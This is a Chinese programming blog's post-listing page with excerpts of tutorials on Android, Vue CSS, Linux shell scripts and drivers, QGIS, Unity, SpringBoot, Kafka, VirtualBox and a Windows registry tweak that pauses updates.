<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91f37d5901f451971c7a74aa7706eb2b/" rel="bookmark">
			Android的PopupWindow弹窗用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.直接上代码
import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.view.LayoutInflater; import android.view.MotionEvent; import android.view.View; import android.view.ViewGroup; import android.widget.LinearLayout; import android.widget.PopupWindow; import android.widget.TextView; public class MainActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TextView textView = (TextView)findViewById(R.id.tv); textView.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { initPopWindow(v); } }); } private void initPopWindow(View v) { View view = LayoutInflater.from(this).inflate(R.layout.pop_layout, null, false); //1.构造一个PopupWindow，参数依次是加载的 View，宽高 //这里设置PopupWindow占满屏幕宽度和占满屏幕高度（也就是全屏显示） final PopupWindow popWindow = new PopupWindow(view, ViewGroup.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91f37d5901f451971c7a74aa7706eb2b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/723d5aa0f94b4969f4cb18391febc290/" rel="bookmark">
			Input框背景颜色的修改 强调色（accent-color）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近还原一个原型图的时候出现了这个样式：
如上，点击后，这个input单选框的背景是绿色的。
实现： html页
给input框绑定一个styleChange的变量，实现input框和变量之间的双向绑定，当点击复选框的时候，styleChange的值会发生变化。
&lt;template&gt; &lt;label for="box"&gt; &lt;input id="box" type="checkbox" v-model="styleChange" :class="{'green': styleChange}"/&gt; &lt;span&gt;&lt;/span&gt; 只看负面 &lt;/label&gt; &lt;/template&gt; &lt;script setup&gt; import { ref } from "vue"; //设置初始为false const showNegative = ref(false); &lt;/script&gt; 接下来就是green样式的写法了：
.green { accent-color: #0f783d; } 只需要accent-color这个属性就可以了
新的属性当然也会有些浏览器不支持，下面是浏览器的兼容情况
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0079a87153287db10c47170fa7c8e0de/" rel="bookmark">
			分账算法代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		// 分账 List&lt;Integer&gt; payTimeAmounts = new ArrayList() {{ add(payTime1); add(payTime2); add(payTime3); }}; int i = 0; int j = 0; int idDif = 0; List&lt;PayIdAmount&gt; result = new ArrayList&lt;&gt;(); outer: for (; i &lt; payTimeAmounts.size(); ) { Integer payAmount = payTimeAmounts.get(i); inner: for (; j &lt; idAmounts.length; ) { IdAmount ia = idAmounts[j]; String id = ia.getId(); int amount = ia.getAmount() - idDif; if (amount &gt; payAmount) { if (payAmount &gt; 0) { PayIdAmount pia = new PayIdAmount(); pia.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0079a87153287db10c47170fa7c8e0de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4125935cd4945bf6378955a42f41ef8a/" rel="bookmark">
			Linux保留最近30天文件的shell脚本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#!/bin/bash # 当前时间 current_time=`date +"%Y-%m-%d %H:%M:%S"` # 保留日志的天数 retain_log_days=30 retain_days_ago_date=`date -d "${retain_log_days} day ago" +%Y%m%d` # 清理的目录集合:须以/结尾 clean_dirs=('/data/bootstart/service/izhaowo_city_expansion_manage/logs/' '/data/bootstart/service/izhaowo_wedding_planning_operation_center_manage/logs/' '/data/service/manage/manage_partner/logs/' '/data/service/manage/worker-excitaion/logs/' '/data/service/manage/aijiuxi-bus/logs/') echo "日志清理开始[$current_time],清理[$retain_days_ago_date]之前的日志..." # 遍历清理 for dir in ${clean_dirs[*]} do echo "开始清理目录[$dir]..." files=`ls $dir -lrt --time-style="+%Y%m%d" | sed "1 d"` # 重置换行符 IFS_OLD=$IFS IFS=$'\n' for file in ${files[*]} do IFS_NEW=$IFS IFS=" " file_date=`echo ${file} | awk '{print $6}'` file_name=`echo ${file} | awk '{print $7}'` if [ $file_date -le $retain_days_ago_date ] then echo "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4125935cd4945bf6378955a42f41ef8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a39a0e2f093abfbd56062d5ddef53c7d/" rel="bookmark">
			Linux驱动进阶(三)——中断与时钟机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言中断简述中断的概念中断的宏观分类中断产生的位置分类同步和异步中断中断小结 中断的实现过程中断信号线(IRQ)中断控制器中断处理过程中断的安装与释放 按键中断实例按键设备原理图有寄存器设备和无寄存器设备按键设备相关端口寄存器 按键中断实例程序分析按键驱动程序组成初始化函数s3c2440_buttons_init()中断处理函数isr_button()退出函数s3c2440_buttons_exit() 时钟机制时间度量时间延时 小结 前言 中断和时钟机制是Linux驱动中重要的两项技术。使用这些技术，可以帮助驱动程序更高效地完成任务。在写设备驱动程序的过程中，为了使系统知道硬件在做什么，必须使用中断。如果没有中断，设备几乎什么都不能做。本章将详细讲解中断与时钟机制。
中断简述 本节将对中断相关概念进行简要的分析，并对中断进行分类。根据不同的中断类型，写中断驱动程序的方法也不一样。下面将主要介绍中断的基本概念和常见分类。
中断的概念 中断是计算机中一个十分重要的概念。如果没有中断，那么设备和程序就无法高效利用计算机的CPU资源。
1.什么是中断
这里以著名的数学家华罗庚老师的一篇科学小品文《统筹方法》来做一个比喻——泡壶茶。
当时的情况是：开水没有；水壶要洗，茶壶茶杯要洗；火生了；茶叶也有了。怎么办？最节约时间的方法是洗好水壶，灌上凉水，放在火上；在等待水开的时间里，洗茶壶、洗茶杯、拿茶叶；等水开了，泡茶喝。
在没有中断的情况下，计算机只能处理一个线性的过程，其要么只烧水，要么只洗茶壶，或者烧完水后再来处理洗茶壶这个事件，这显然是非常浪费时间的。不使用中断方式和使用中断方式泡茶喝水的过程如下图。
由于使用中断机制更为高效，所以计算机中引进了中断机制。在烧水的过程中处理洗茶壶、洗茶杯、拿茶叶，这些短时间的事情，其好处就是能使洗茶壶这个事件尽快得到执行，从而最快地完成泡茶喝这个任务。对应地，在计算机执行程序的过程中，由于出现某个特殊情况（或称为"事件"），使得暂时中止正在运行的程序，而转去执行这一特殊事件的处理，处理完毕之后再回到原来程序继续向下执行，这个过程就是中断。
2.中断在Linux中的实现
中断在Linux中仅仅是通过信号来实现的。当硬件需要通知处理器一个事件时，就可以发送一个信号给处理器。例如，当用户按下手机键盘的应答键时，就会向手机处理器发送一个信号。处理器接收到这个信号后，就会调用喇叭和话筒驱动程序，使用户可以进行通话。
通常情况下，一个驱动程序只要申请中断，并添加中断处理函数就可以了。中断的到达和中断处理函数的调用，都是由内核框架完成的。这样就减少了程序员的很多负担，程序员只要保证申请了正确的中断号及编写了正确的中断处理函数就可以了。
说明：大多数手机使用的都是ARM处理器。对于驱动刚刚入门的读者，不知道应该选择什么处理器来学习。目前最为流行的处理器之一是ARM处理器。其广泛的应用于数字音频播放器、数字机顶盒、游戏机、数码相机和打印机等设备中。
中断的宏观分类 在Linux操作系统中，中断的分类是非常复杂的。根据不同的角度，可以将中断分为不同的类型。各种类型之间的关系并非相互独立，往往是相互交叉的。从宏观上可以分为两类，分别是硬中断和软中断。
1.硬中断
硬中断就是由系统硬件产生的中断。系统硬件通常引起外部事件。外部事件具有随机性和突发性，因此硬中断也具有随机性和突发性。例如当用户使用手机时，正常情况下处于待机状态，待机状态下CPU处理时钟和电源管理方面的问题。当手机的GSM模块接收到来电请求时，会通过连接到CPU的中断线向CPU发送一个硬件中断请求。CPU接收到该中断后，会立刻处理预先定义好的中断处理程序。该中断处理程序会调用铃声驱动程序或者电机驱动程序，使手机响起铃声或震动，等待用户接听电话。
硬件中断具有随机性和突发性的原因是手机根本无法预见电话什么时候到来。另外硬中断是可以屏蔽的。目前许多手机具有飞行模式，在飞机上可以自动屏蔽来电。
2.软中断
软中断是执行中断指令时产生的。软中断不用外设施加中断请求信号，因此中断的发生不是随机的而是由程序安排好的。在汇编程序设计中经常会使用软中断指令，比如int n，n必须是中断向量。
处理器接收软中断有两个来源，一是处理器执行到错误的指令代码，如除零错误；二是由软件产生中断，如进程的调度就是使用的软中断方式。
中断产生的位置分类 从中断产生的位置，可以将中断分为外部中断和内部中断。
1.外部中断
外部中断一般是指由计算机外设发出的中断请求，键盘中断、打印机中断、定时器中断等。外部中断是可以通过编程方式给予屏蔽。
2.内部中断
内部中断是指因硬件出错(如突然掉电、奇偶校验等)或运算出错（除数为零，运算溢出、单步中断等）所引起的中断。内部中断是不可屏蔽的中断。通常情况下，大多数内部中断都由Linux内核进行处理，所以驱动程序员往往不需要关系这些问题。
同步和异步中断 从指令执行的角度，中断又可分为同步中断和异步中断
1.同步中断
同步中断是指令执行的过程中由CPU控制的，CPU在执行完一条指令后才发出中断。也就说，在指令执行过程中，即使有中断的到来，只要指令还没执行完，CPU就不会去执行该中断。同步中断一般是因为程序错误所引起的，例如内存管理中的缺页中断，被0除出错等。当CPU决定处理同步中断时，会调用异常处理函数，使系统从错误的状态恢复过来。当错误不可恢复时，就会出现死机和蓝屏等现象。Windows系统以前的版本经常出现蓝屏现象，就是因为无法从异常恢复的原因。
2.异步中断
异步中断是由硬件设备随机产生的，产生中断时并不考虑与处理器的时钟同步问题，该类型的中断是可以随时产生的。例如在网卡驱动程序中，当网卡接收到数据包后，会向CPU发送一个异步中断事件，表示数据到来，CPU并不知道何时将接收事件。异步中断的中断处理函数与内核的执行顺序是异步执行的，两者没有必然的联系，也不会相互影响。
中断小结 以上4节从不同的角度对Linux中的中断进行了分类，但这不是严格的分类。例如，硬中断可以是外部中断也可以是异步中断，同时，软中断可以是内部中断也可以是同步中断，如下图：
中断的实现过程 中断的实现过程是一个比较复杂的过程。其涉及中断信号线、中断控制器等概念。首先介绍中断信号线的概念。
中断信号线(IRQ) 中断信号线是对中断输入线和中断输出线的统称。中断输入线是指接收中断信号的引脚。中断输出线是指发送中断信号线的引脚。每一个能够产生中断的外设都有一条或者多条中断输出线(Interrupt ReQuest，简称IRQ)，用来通知处理器产生中断。相应地，处理器也有一组中断输入线，用来接收连接到它的外部设备发出的中断信号。
如下图，外设1、外设2、外设3都通过自己的中断输出线连接到ARM处理器上的不同中断输入线上。每一条IRQ线都是有编号的，一般从0开始编号，编号也可以叫做中断号。在写设备驱动程序的过程中，中断号往往需要驱动开发人员来指定。这时，可以查看硬件开发板的原理图，找到设备与ARM处理器的连接关系，如连接到0号中断线，那么中断号就是0。
中断控制器 中断控制器位于ARM处理器核心和中断源之间。外部中断源将中断发送到中断控制器。中断控制器根据优先级进行判断，然后通过引脚将中断请求发送给ARM处理器核心。ARM处理器内部中断控制器如下图所示。
当外部设备同时产生中断时，中断优先级产生逻辑会判断哪一个中断将被执行。如上图中的中断屏蔽寄存器，当屏蔽位为1时，表示对应的中断被禁止；当屏蔽位为0时，表示对应的中断可以正常执行。不同的处理器屏蔽位0/1的意义可能有所不同。
中断处理过程 Linux处理中断的整个过程如下图。
外设产生一个中断信号，该中断通过中断线以电信号的方式发送给中断控制器。中断控制器一直检查IRQ线，检查是否有信号产生。如果有一条或者多条IRQ线产生信号，那么中断控制器就先处理中断编号较小的IRQ线，其优先级较高。中断控制器将收到的该中断号存放在I/O端口A中，该端口直接连接到CPU的数据总线上。这样，CPU可以通过数据总线读出端口A中的中断号。当一切准备就绪后，中断控制器才发送一个信号给CPU的INTR引脚，这时CPU在指令周期的适当时刻，就会分析该信号，以决定中断的类型。如果中断是由外部设备引起的，就会发送一个应答信号给中断控制器的端口B。端口B被设置位一个中断挂起值，表示CPU正在执行该中断，此时不允许该中断再一次产生。CPU根据中断号确定相应的中断处理函数。 中断的安装与释放 当设备需要中断功能时，应该安装中断。如果驱动程序员没有通过安装中断的方式通知Linux内核需要使用中断，那么内核只会简单的应答并且忽略该中断。
1.申请中断线
申请中断线可以使内核知道外设应该使用哪一个中断号，哪一个中断处理函数。申请中断线在需要与外部设备交互时发生。Linux内核提供了request_irq()函数申请中断线。在Linux2.6.29中，该函数由&lt;kernel/irq/Mabage.c&gt;实现。
int request_irq(unsigned int irq, irq_handler_t handler, unsigned long irqflags, const char *devname, void *dev_id); irq表示要申请的中断号，中断号由开发板的硬件原理图决定。handler表示要注册的中断处理函数指针。当中断发生时，内核会自动调用该函数来处理中断。irqflags表示关于中断处理的属性。内核通过这个标志可以决定该中断应该如何处理，在中断上半部和下半部机制中，会详细讲解这部分知识。devname表示设备名字，该名字会在/proc/interrupts中显示。interrupts记录了设备和中断号之间的对应关系。dev_id这个指针是为共享中断线而设立的。如果不需要共享中断线，那么只要将该指针设为NULL即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a39a0e2f093abfbd56062d5ddef53c7d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2b7f56f1b601c6c5598324439f5a183/" rel="bookmark">
			Ubuntu 22.04 配置 QGIS二次开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源码地址，以及官方指导文档地址 源码地址：https://github.com/qgis/QGIS/releases
QGIS 官方指导文档地址：https://github.com/qgis/QGIS/blob/release-3_26/INSTALL.md（此处为3.26的指导文档，可以自行修改查看）
编译前先安装依赖库 sudo apt-get install bison ca-certificates ccache cmake cmake-curses-gui dh-python doxygen expect flex flip gdal-bin git graphviz grass-dev libexiv2-dev libexpat1-dev libfcgi-dev libgdal-dev libgeos-dev libgsl-dev libpq-dev libproj-dev libprotobuf-dev libqca-qt5-2-dev libqca-qt5-2-plugins libqscintilla2-qt5-dev libqt5opengl5-dev libqt5serialport5-dev libqt5sql5-sqlite libqt5svg5-dev libqt5webkit5-dev libqt5xmlpatterns5-dev libqwt-qt5-dev libspatialindex-dev libspatialite-dev libsqlite3-dev libsqlite3-mod-spatialite libyaml-tiny-perl libzip-dev lighttpd locales ninja-build ocl-icd-opencl-dev opencl-headers pkg-config poppler-utils protobuf-compiler pyqt5-dev pyqt5-dev-tools pyqt5.qsci-dev python3-all-dev python3-autopep8 python3-dateutil python3-dev python3-future python3-gdal python3-httplib2 python3-jinja2 python3-lxml python3-markupsafe python3-mock python3-nose2 python3-owslib python3-plotly python3-psycopg2 python3-pygments python3-pyproj python3-pyqt5 python3-pyqt5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2b7f56f1b601c6c5598324439f5a183/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4a1ba7f072094d5cf5f3dcdbf37db81/" rel="bookmark">
			Unity开发笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、切换场景报错'SecneManagement' does not exist in the namespace 'UnityEngine'
最后发现是 SceneManager单词拼错了。
二、导入的资源粉红色，改纹理也不起作用。
渲染管道问题，不同管道不兼容，项目开始前就要确定渲染方案。
纹理shader显示所用的渲染方案
在编辑-&gt;项目设置里修改成纹理所需的就行。
如果只有None，就去下载导入 ，Window-&gt;Package Manager，点击后弹窗左上角改为如图所示，右边搜索。下载后重复上一步骤。
三、人物透明不显示
发现是太小了，放大100倍后正常显示。
四、打包apk报错，黑屏
报错看报错提示，运行黑屏看生成设置的玩家设置。
五、手机端摇杆控制人物移动，场景漫游
刚开始用Joystick，后来技术顾问用EasyTouch，遇到了人物平移无动画，移动不流畅，人物移动也场景漫游等Bug，最后我发现unity自带的StarterAssets就具有这个功能，只是没开启。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ca670ca6afe2c70cbed27e11e5a063a/" rel="bookmark">
			正点原子linux 使用QT 自动检测u盘插拔并寻找特定文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 正点原子开发板Alpha配置环境需求linux自动挂载u盘使用udev自动挂载u盘mount.sh代码解析 查看u盘挂载情况使用QT检测u盘插入1.增加头文件libudev.h2.在.pro增加QT application对libudev库的链接3.在头文件.h里新建udev结构体指针并在构造函数里初始化udev4.创建udev监视器并用QT槽连接处理函数5.在析构函数里增加对udev的释放6.编写u盘插入处理函数 已插入U盘检测 笔者刚解决完这个问题，前期有些忘了，一点一点回忆。会慢慢更新。
正点原子开发板Alpha配置环境需求 笔者使用的是Alpha出厂系统，也就是用Yocto做的根文件系统。这个系统里包含了QT和很多其他必要的库，可以不用在开发板上再安装了。
linux自动挂载u盘 使用udev自动挂载u盘 正点原子提供的出厂系统中已经内置了用udev自动挂载u盘的脚本，在/etc/udev 文件夹下有个脚本文件夹scripts，里面有个自动挂载的脚本mount.sh，部分内容如下：
... automount() {	name="`basename "$DEVNAME"`" ! test -d "/mnt/$name" &amp;&amp; mkdir -p "/mnt/$name" # Silent util-linux's version of mounting auto if [ "x`readlink $MOUNT`" = "x/bin/mount.util-linux" ] ; then MOUNT="$MOUNT -o silent" fi # If filesystem type is vfat, change the ownership group to 'disk', and # grant it with w/r/x permissions. case $ID_FS_TYPE in vfat|fat) MOUNT="$MOUNT -o umask=007,gid=`awk -F':' '/^disk/{print $3}' /etc/group`"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ca670ca6afe2c70cbed27e11e5a063a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3306830d2d854d9106d1de58c46b8367/" rel="bookmark">
			【语义分割】评价指标：Dice系数，Jaccard系数(IoU)，Hausdorff distance
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1、Dice系数2、Jaccard系数(IoU)3、Hausdorff distance 1、Dice系数 Dice系数是一种集合的相似度度量函数，用于计算2个样本的相似度。值在0-1之间，越大表示2个样本越相似，在语义分割中，表示的就是预测结果pred 和 ground truth之间越相似。 D i c e = 2 ∣ X ∩ Y ∣ ∣ X ∣ + ∣ Y ∣ Dice = \frac{2|X\cap Y|}{|X|+|Y|} Dice=∣X∣+∣Y∣2∣X∩Y∣​语义分割还常用Dice loss = 1 - Dice计算代码如下： def dice_coeff(pred, target): smooth = 1e-7 num = pred.size(0) A= pred.view(num, -1) # Flatten B= target.view(num, -1) # Flatten intersection = (A * B).sum() return (2. * intersection + smooth) / (A.sum() + B.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3306830d2d854d9106d1de58c46b8367/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/848aa4e65dfbfd9ac54b5cd955be60a0/" rel="bookmark">
			SpringBoot 集成 Mybatis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SpringBoot 集成 Mybatis 详细教程 （只有操作，没有理论，仅供参考学习） 一、操作部分 1. 准备数据库 1.1 数据库版本：
C:\WINDOWS\system32&gt;mysql -V mysql Ver 8.0.25 for Win64 on x86_64 (MySQL Community Server - GPL) 1.2 启动 mysql 服务：
C:\WINDOWS\system32&gt;net start mysql The MySQL service is starting.. The MySQL service was started successfully. 1.3 新创建数据库 spring，并创建一个 user 表，user 表详情：
Column Name Datatype	PrimaryKey Unique id INT	√	√ username	VARCHAR(45)	password	VARCHAR(45)	如下图：
2. 创建工程 2.1 使用 spring 官网页面创建工程（其他亦可），链接：Spring Initializr 创建 SpringBoot 工程，如下图：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/848aa4e65dfbfd9ac54b5cd955be60a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9607a0087bcca97f6baea185e707734/" rel="bookmark">
			Ubuntu环境下利用VirtualBox6.1安装虚拟机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境： （1）宿主机系统：Ubuntu20.04 LTS
（2）虚拟机软件：VirtualBox6.1
（3）虚拟机系统：Ubuntu20.04 LTS
你没看错，就是在Ubuntu20.04上再安装一个Ubuntu20.04。这里主要是为了演示Ubuntu环境下安装虚拟机的方法 ~
1. VirtualBox下载与安装 （1）可以直接到Ubuntu Software中搜索VirtualBox
（2）直接单击Install进行安装
2. 创建一个虚拟机 （1）打开VirtualBox6.1，选择"New"新建一个新的虚拟机
（2）配置虚拟机的名称，"Type"选择"Linux"，"Version"选择"Ubuntu(64-bit)"
（3）分配虚拟机内存（按照实际需求合理分配）
（4）现在创建虚拟硬盘
（5）虚拟硬盘文件类型选择"VDI(VirtualBox Disk Image)"
（6）虚拟硬盘采用动态分配的方式
（7）选择虚拟硬盘的大小，此大小是虚拟机能够存储再硬盘上的文件数据量的限制。
3. 在创建的虚拟机中安装ubuntu20.04 LTS （1）下载ubuntu20.04 LTS系统镜像
下载地址：Ubuntu 20.04.3 LTS (Focal Fossa) ，这里选择64-bit的desktop版本
（2）点击VirtualBox6.1界面的"Settings"图标，对刚才创建的虚拟机进行配置
（3）按照下图所示方法挂载ubuntu20.04的镜像文件
（4）设置网络模式为"NAT"
（5）点击"Start"图标启动虚拟机（安装时请保证网络处于连通状态）
注意：VirtualBox6.1启动虚拟机的时候若报错，可尝试下述命令进行修复（修不好不负责~）
sudo apt install --reinstall virtualbox-dkms （6）语言选择"English"，安装选项选择右边的"Install Ubuntu"
（7）键盘布局选择"English(US)"，然后点击"Continue"进行下一步
（8）这里保持默认选项，点击"Continue"
（9）这里依旧保持默认配置，同样点击"Continue"进行下一步
跳出一个对话框，点击"Continue"即可。
（10）接下来是时区配置，这里输入"Shanghai"
（11）最后设置用户名和密码
（12）等待系统安装完成（安装时间较长，请耐心等待~）
（13）安装完成后可能会提示："Please remove the installation medium, then reboot."
这是提示我们将安装镜像解除挂载，然后重启系统。
首先勾选"ubuntu-20.04.3-desktop-amd64.iso"复选框，然后点击"Remove disk from virtual drive" 弹出如下提示框，点击"Force Unmount"即可。然后按下Enter重启系统。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9607a0087bcca97f6baea185e707734/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a01e2f09d380ea7079b5b76cec134e4/" rel="bookmark">
			Linux系统配置开机自动启动Jar项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux系统配置开机自动启动Java项目 在我们写完项目后，项目后端要部署到服务器上。如遇到服务器出现故障导致重启，项目还需要手动进行启动，才不会影响项目的正常运行。
这篇文章为大家提供配置Java项目系统开机自启！
1、准备工作 Linux中Java的路径项目jar包绝对路径项目外置配置文件（没有可不准备） 2、创建自启脚本jar_auto.sh 在/etc/rc.d/init.d目录下创建jar_auto.sh文件可使用vi命令或touch命令创建jar_auto.sh，文件名称可自定义
# 改变目录 cd /etc/rc.d/init.d # 创建文件 vi jar_auto.sh # 或 touch jar_auto.sh 创建好后编写自定义启动脚本内容
#!/bin/bash # 表示延迟30秒启动 # sleep 30 # 配置jar包启动的路径 日志生成路径 nohup表示静默启动 # 两种启动jar包命令的写法，one.使用java的绝对路径的命令，two.使用已配置好的全局java命令（根据自己喜好二选一即可） # one.使用java的绝对路径的命令 nohup /usr/local/baseServer/jdk1.8/bin/java -mx256M -Diname=buss-admin -Xrs -jar /home/application/bussManager/lib/buss-admin.jar --spring.config.location=/home/application/bussManager/conf/application.yml &gt; /home/application/bussManager/logs/buss-admin.log&amp; # two.使用已配置好的全局java命令 #nohup java -mx256M -Diname=buss-admin -Xrs -jar /home/application/bussManager/lib/buss-admin.jar --spring.config.location=/home/application/bussManager/conf/application.yml &gt; /home/application/bussManager/logs/buss-admin.log&amp; # 如果有多个jar需要启动，可以继续按照one或two配置。如下： #nohup java -jar /home/application/bussManager/jar/one.jar &gt; /home/application/bussManager/logs/one.log&amp; #nohup java -jar /home/application/bussManager/jar/two.jar &gt;/home/application/bussManager/logs/two.log&amp; 如果有需要延时启动，可以使用sleep + 数字（标识延迟多少秒启动）进行设置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a01e2f09d380ea7079b5b76cec134e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c5920f64d86d62b8c22718a169ce584/" rel="bookmark">
			Kafka集群新增数据及日志文件路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、增加Kafka的主题数据目录 新目录准备
在/home下新增kafka/datalogs目录
mkdir -p /home/kafka/datalogs 其中kafka和datalogs的属组改为kafka chown -R /home/kafka chown -R /home/kafka/datalogs 修改config/server.properties文件
在原属性后增加新的路径，范例如下：
# 修改前 log.dirs=/opt/kafka_2.12-2.5.1/kafka-logs-1 # 修改后 log.dirs=/opt/kafka_2.12-2.5.1/kafka-logs-1,/home/kafka/datalogs 修改数据日志保留策略
还是config/server.properties文件
具体保留数量根据现场磁盘空间和行方磁盘告警要求进行调整。
#保留小时数（168h=7天） log.retention.hours=168 #总保留字节（100G） log.retention.bytes=107374182400 二、移动kafka的运行日志目录 新目录准备
在/home下新增kafka/logs目录
mkdir -p /home/kafka/logs logs目录的属组改为kafka chown -R /home/kafka/logs 修改kafka-run-class.sh文件 vim /opt/kafka_2.12-2.5.1/bin/kafka-run-class.sh # Log directory to use # 在上面注释的下一行增加 LOG_DIR=/home/kafka/logs 修改后的结果参考如下： # Log directory to use # 在上面注释的下一行增加 LOG_DIR=/home/kafka/logs if [ "x$LOG_DIR" = "x" ]; then LOG_DIR="$base_dir/logs" fi 三、重启kafka服务 逐个重启kafka集群中的节点
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c5920f64d86d62b8c22718a169ce584/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97911b3edc7d8834d42e61dc293a1348/" rel="bookmark">
			（自用笔记）常用Cron表达式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 每两小时执行一次
@Scheduled(cron = "0 0 */2 * * ?") 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d69d7847dc795238a8a542eb8ef57826/" rel="bookmark">
			Win10“永久”暂停自动更新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章整理自微信公众号“电手”，亲测有效；
原文：唯一无副作用禁用Win10/11更新方法，一键暂停1000周
1 暂停更新 创建一个.txt文件，导入以下代码：
Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings] "FlightSettingsMaxPauseDays"=dword:00001b58 "PauseFeatureUpdatesStartTime"="2023-07-07T10:00:52Z" "PauseFeatureUpdatesEndTime"="2042-09-05T09:59:52Z" "PauseQualityUpdatesStartTime"="2023-07-07T10:00:52Z" "PauseQualityUpdatesEndTime"="2042-09-05T09:59:52Z" "PauseUpdatesStartTime"="2023-07-07T09:59:52Z" "PauseUpdatesExpiryTime"="2042-09-05T09:59:52Z" 将文件后缀名由.txt改为.reg，双击运行，即可生效，如下：
2 恢复更新 创建一个.txt文件，导入以下代码：
Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings] "FlightSettingsMaxPauseDays"=- "PauseFeatureUpdatesStartTime"=- "PauseFeatureUpdatesEndTime"=- "PauseQualityUpdatesStartTime"=- "PauseQualityUpdatesEndTime"=- "PauseUpdatesStartTime"=- "PauseUpdatesExpiryTime"=- 将文件后缀名由.txt改为.reg，双击运行，即可生效。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c234060cd0e834372ab0b81a5c0b693/" rel="bookmark">
			IIS部署vue项目刷新404问题
			</a>
